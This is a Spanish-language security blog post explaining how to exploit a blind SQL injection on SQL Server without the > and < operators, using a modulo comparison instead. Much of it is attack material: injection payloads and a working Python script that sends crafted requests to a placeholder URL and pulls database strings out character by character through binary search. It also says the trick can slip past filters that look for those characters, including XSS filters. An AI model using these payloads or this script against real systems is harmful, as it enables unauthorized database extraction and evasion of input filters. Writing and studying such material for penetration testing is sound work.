---
layout: post
title: "Blind SQLi Trick"
author: "RoP Team"
description: "¿Cómo explotar un Blind SQLi sin los operadores de mayor o menor?"
keywords: "sqli, web, trick"
date: 2020-10-30 00:00:00 -0500
categories: web
lang: es
lang-ref: blind-sqli-trick
---

¿Se puede escribir más sobre SQL Injection? No hace mucho tuve que explotar un SQLi donde el parámetro vulnerable se usaba también para crear un archivo como parte del nombre. Puesto que el servidor era Windows, incluir los caracteres `>` y `<` en la inyección provocaba un error que impedía la explotación. Sepa que estos caracteres ([y otros](https://stackoverflow.com/questions/1976007/what-characters-are-forbidden-in-windows-and-linux-directory-names)) no se permiten para nombrar archivos. Dicho sea de paso, se trataba de un Blind SQLi donde el uso de los mencionados operadores de comparación es necesario para implementar el algoritmo de búsqueda binaria ¿O quizá no?

<!--more-->

### Búsqueda binaria

La búsqueda binaria consiste en *acorralar* un valor desconocido dentro de un intervalo e ir reduciendo el intervalo progresivamente hasta deducir dicho valor. Para reducir el intervalo se pregunta si el valor desconocido es menor o mayor que la mitad del intervalo y, según la respuesta obtenida, se toma la mitad inferior o superior (respectivamente) para la siguiente iteración.

Así pues, en un Blind SQLi, usamos este algoritmo para preguntar si el valor numérico de la primera letra de la clave del administrador (`X`) es mayor o menor que un `M`, siendo `M` la mitad de un intervalo conocido por nosotros (por ejemplo, el código ASCII). En no más de 8 iteraciones hallaremos `X` y continuaremos con la segunda letra.

```sql
' AND X > M -- 
```

### Búsqueda binaria sin `>` o `<`

La pregunta es ¿Cómo compararar dos valores sin los operadores de comparación? Luego de un rato pensandolo se me ocurrió utilizar el operador módulo. Recuerde que el módulo es el residuo de una división entera. Así que se cumplirá:

$$ X > M  \rightarrow  (M\ mod\ X) = M$$

La inyección equivalente sería:

```sql
' AND (M%X)=M -- 
```

Todos los caracteres involucrados son perfectamente válidos para nombrar archivos.

### Implementación

El siguiente es un sencillo script en python que implementa este tipo de inyección. Olvidé mencionarlo antes: la base de datos era SQL Server.

```python
from urllib.parse import quote_plus
import requests


def inject(payload):
    url = 'https://vulnerable.com/?sqli={}'
    resp = requests.get(url.format(quote_plus(payload)))
    return 'STRING IF TRUE' in resp.text


def binary_search(expression, lmin=0, lmax=255):
    if lmin == lmax:
        return lmin
    value = (lmin + lmax) // 2
    #  expression > value
    payload = "' AND ({value}%{expression})={value} -- ".format(expression=expression, value=value)
    if inject(payload):
        return binary_search(expression, value + 1, lmax)
    else:
        return binary_search(expression, lmin, value)


def extract_string(expression, lmin=0, lmax=100):
    payload = "(length({expression}))".format(expression=expression)
    slen = binary_search(expression=payload, lmin=lmin, lmax=lmax)

    payload = "UNICODE(SUBSTRING(({expression}),{index},1))"
    return ''.join([
        chr(binary_search(payload.format(expression=expression, index=i)))
        for i in range(1, slen + 1)
    ])


print(extract_string('db_name()'))
```

### Conclusiones

- Sí es posible implementar la búsqueda binaria sin los operadores de comparación. Esto nos ahorra mucho tiempo puesto que la alternativa hubiera sido usar una búsqueda secuencial.
- Este mismo truco se puede utilizar también para burlar algunos filtros que detecten los caracteres `>` y `<` como XSS.
- Las herramientas como SQLMap son útiles pero siempre van a tener limitaciones. Es necesario conocer las técnicas de explotación y los algoritmos involucrados.
- ~~La recursividad solo sirve para escribir menos líneas de código~~

¡Hasta pronto!

> Escrito por **RoP Team**